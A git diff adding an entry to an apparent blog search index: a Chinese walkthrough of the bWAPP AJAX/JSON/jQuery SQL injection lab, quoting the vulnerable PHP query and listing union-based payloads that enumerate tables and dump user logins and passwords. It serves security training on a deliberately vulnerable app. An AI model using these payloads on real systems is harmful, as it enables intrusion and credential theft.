@@ -1,6 +1,68 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>bWAPP-SQLInjection-AJAXJSONjQuery</title>
+    <url>/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/</url>
+    <content><![CDATA[<h1 id="AJAX-JSON-jQuery注入"><a href="#AJAX-JSON-jQuery注入" class="headerlink" title="AJAX/JSON/jQuery注入"></a>AJAX/JSON/jQuery注入</h1><h2 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h2><p><strong>1.判断是否存在注入，注入是字符型还是整数型</strong></p>
+<p><strong>2.猜解SQL查询语句中的字段数 (order by )</strong></p>
+<p><strong>3.确定显示的字段顺序</strong> </p>
+<p><strong>4.获取当前数据库 (爆库)</strong></p>
+<p><strong>5.获取数据库中的表 (爆表)</strong></p>
+<p><strong>6.获取表中的字段名 (爆字段)</strong></p>
+<p><strong>7.下载数据 (爆数据)</strong></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="什么是AJAX-JSON-jQuery"><a href="#什么是AJAX-JSON-jQuery" class="headerlink" title="什么是AJAX/JSON/jQuery"></a>什么是AJAX/JSON/jQuery</h3><p>通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行实时更新。</p>
+<p><a href="https://blog.csdn.net/cainiao_00001/article/details/82888692" target="_blank" rel="noopener">AJAX/JSON/jQuery</a></p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//sqli_10-1.php</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">        $(<span class="string">"#title"</span>).keyup(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;                <span class="comment">// #title为表格的ID值</span></span><br><span class="line">            <span class="comment">// Searches for a movie title</span></span><br><span class="line">            <span class="keyword">var</span> search = &#123;<span class="attr">title</span>: $(<span class="string">"#title"</span>).val()&#125;; <span class="comment">//获取输入的值，制成JSON格式</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// AJAX call</span></span><br><span class="line">        	<span class="comment">//getJSON(url,data,success(data,status,xhr))</span></span><br><span class="line">            $.getJSON(<span class="string">"sqli_10-2.php"</span>, search, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123; <span class="comment">//data 接收返回的数据</span></span><br><span class="line">                init_table();								 <span class="comment">//初始化表头</span></span><br><span class="line">                <span class="comment">// Constructs the table from the JSON data</span></span><br><span class="line">                <span class="keyword">var</span> total = <span class="number">0</span>;</span><br><span class="line">                $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, val</span>)</span>&#123;			<span class="comment">//循环输出JSON数据，制成表格</span></span><br><span class="line">                    total++;</span><br><span class="line">                    $(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr&gt;&lt;td&gt;"</span> + val.title + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.release_year + <span class="string">"&lt;/td&gt;&lt;td&gt;"</span> + val.main_character + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;"</span> + val.genre + <span class="string">"&lt;/td&gt;&lt;td align='center'&gt;&lt;a href='http://www.imdb.com/title/"</span> + val.imdb + <span class="string">"' target='_blank'&gt;Link&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">                <span class="comment">// Empty result</span></span><br><span class="line">                <span class="keyword">if</span> (total == <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    $(<span class="string">"#table_yellow tr:last"</span>).after(<span class="string">"&lt;tr height='30'&gt;&lt;td colspan='5' width='580'&gt;No movies were found!&lt;/td&gt;&lt;/tr&gt;"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//"sqli_10-2.php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">"title"</span>]))    <span class="comment">//接收数据，并使用自定义函数sqli()对数据进行消毒</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Retrieves the movie title</span></span><br><span class="line">    $title = $_GET[<span class="string">"title"</span>];</span><br><span class="line">    <span class="comment">// Constructs the query</span></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM movies WHERE title LIKE '%"</span> . sqli($title) . <span class="string">"%'"</span>;</span><br><span class="line">    <span class="comment">// Queries the database</span></span><br><span class="line">    $recordset = mysql_query($sql, $link);</span><br><span class="line">    <span class="comment">// Fetches the result</span></span><br><span class="line">    <span class="keyword">if</span>(mysql_num_rows($recordset) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($recordset))</span><br><span class="line">        &#123;</span><br><span class="line">            $movies[] = $row;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $movies = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $movies = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.w3school.com.cn/jquery/ajax_getjson.asp" target="_blank" rel="noopener">getJSON</a></p>
+<h2 id="演练"><a href="#演练" class="headerlink" title="演练"></a>演练</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><ol>
+<li><p>判断是否存在注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' and 1=1 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195015337.png" alt="image-20200921195015337"></p>
+</li>
+<li><p>判断注入字段个数</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' order by 7 <span class="comment">#</span></span><br><span class="line">a%' order by 8 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195205297.png" alt="image-20200921195205297"></p>
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195218407.png" alt="image-20200921195218407"></p>
+</li>
+<li><p>判断注入字段位置</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195316105.png" alt="image-20200921195316105"></p>
+</li>
+<li><p>获取数据库信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195347434.png" alt="image-20200921195347434"></p>
+</li>
+<li><p>获取表名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195541640.png" alt="image-20200921195541640"></p>
+</li>
+<li><p>获取列名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"users"</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195749587.png" alt="image-20200921195749587"></p>
+</li>
+<li><p>获取信息</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">a%' union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(login,<span class="string">'-'</span>,<span class="keyword">password</span>,<span class="string">'-'</span>) <span class="keyword">from</span> <span class="keyword">users</span>),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span> <span class="keyword">limit</span> <span class="number">9</span>,<span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/21/bWAPP-SQLInjection-AJAXJSONjQuery/image-20200921195833856.png" alt="image-20200921195833856"></p>
+</li>
+</ol>
+<h3 id="mid-high"><a href="#mid-high" class="headerlink" title="mid/high"></a>mid/high</h3><p>分别用了addslashes()和mysql_real_escape_string()函数防御</p>
+<p>查看mysql编码, 如果是GBK编码且操作系统是UTF-8编码, 则可以用宽字节来绕过:</p>
+<p>可惜mysql编码是utf-8:</p>
+]]></content>
+  </entry>
+  <entry>
     <title>bWAPP-SQLInjectionPost2</title>
     <url>/2020/09/20/bWAPP-SQLInjectionPost2/</url>
     <content><![CDATA[<h1 id="POST整型注入"><a href="#POST整型注入" class="headerlink" title="POST整型注入"></a>POST整型注入</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1+and+1=1<span class="comment">#</span></span><br><span class="line">1+and+1=2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
